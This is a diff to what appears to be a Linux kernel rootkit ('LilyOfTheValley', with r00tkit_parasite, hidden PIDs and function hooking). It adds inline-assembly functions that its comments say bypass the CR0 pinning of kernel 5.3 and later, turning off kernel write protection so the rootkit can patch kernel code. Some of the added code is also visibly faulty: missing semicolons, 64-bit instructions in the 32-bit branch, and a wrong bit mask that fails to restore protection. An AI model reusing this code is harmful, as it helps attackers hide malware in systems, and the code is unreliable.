@@ -15,7 +15,7 @@
 
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Mostafa Algayar");
+MODULE_AUTHOR("Mostafa Algayar and Alvin Schurman");
 
 
 
@@ -28,12 +28,14 @@ macro fucntions && constants
 
 #define MIN(x,y) ((x) < (y) ? (x) : (y))
 
-
+/*
+The following macros have been replaced by functions below using the same names
+ 
 //clear the WP (write protect) bit in cr0 reg, so cpu can write to readonly pages whilst in ring0 
-#define unprotect_memory()	(write_cr0(read_cr0() & (~0x10000)))
+#define unprotect_kmem()	(write_cr0(read_cr0() & (~0x10000)))
 
-#define protect_memory() 	(write_cr0(read_cr0() | 0x10000))
-
+#define protect_kmem() 	(write_cr0(read_cr0() | 0x10000))
+*/
 
 
 /*
@@ -139,6 +141,68 @@ struct hidden_pids
 proc_dir_entry structure is not declared in proc_fs.h starting with kernel version 3.10.
 the structure differs a bit between newer kernel versions
 */
+
+/******************************************************************************
+*******************************************************************************
+unprotect_kmem() and protect_kmem() funtions 
+- Extends LilyOfTheValley to modern Linux x86 and x86_64 kernels
+- Enables bypassing Control Register Pinning for CR0 incorporated into Linux 
+  Kernel 5.3 and newer: https://kernelnewbies.org/Linux_5.3
+- Uses kernel version conditional and the old write_cr0 function for clarity 
+- Adds kernel preemption to avoid race conditions between CR0 reads and writes
+
+Copyright 2020 Alvin Schurman   
+******************************************************************************/
+
+void unprotect_kmem(void) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 3, 0)
+	write_cr0(read_cr0() & (~0x10000))
+#else
+	#if defined(__i386__)
+		preempt_disable();
+		asm("pushq %eax");
+		asm("movq %cr0, %eax");
+		asm("andq $0xfffeffff, %eax");
+		asm("movq %eax, %cr0");
+		asm("popq %eax");
+		preempt_enable();
+	#else
+		preempt_disable();
+		asm("pushq %rax");
+		asm("movq %cr0, %rax");
+		asm("andq $0xfffffffffffeffff, %rax");
+		asm("movq %rax, %cr0");
+		asm("popq %rax");
+		preempt_enable();
+	#endif
+#endif
+}
+
+void protect_kmem(void) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 3, 0)
+	write_cr0(read_cr0() | 0x10000)
+#else
+	#if defined(__i386__)
+		preempt_disable();
+		asm("pushq %eax");
+		asm("movq %cr0, %rax");
+		asm("xorq $0x00001000, %eax");
+		asm("movq %eax, %cr0");
+		asm("popq %eax");
+		preempt_enable();
+	#else
+		preempt_disable();
+		asm("pushq %rax");
+		asm("movq %cr0, %rax");
+		asm("xorq $0x0000000000001000, %rax");
+		asm("movq %rax, %cr0");
+		asm("popq %rax");
+		preempt_enable();
+	#endif
+#endif
+}
+/******************************************************************************
+******************************************************************************/
 
 //for 4.X
 //copied from /fs/proc/internal.h 
@@ -499,7 +563,7 @@ static void r00tkit_parasite(void *target_func_addr,unsigned char install_parasi
 	//we can't leave cpu while hijacking the targtet function bytes
 	preempt_disable();
 
-	unprotect_memory();
+	unprotect_kmem();
 			
 	list_for_each_entry(hook,&hooked_functions_listhead,hook_list)
 	{
@@ -516,7 +580,7 @@ static void r00tkit_parasite(void *target_func_addr,unsigned char install_parasi
 		}
 	}
 
-	protect_memory();
+	protect_kmem();
 
 	preempt_enable();
 }
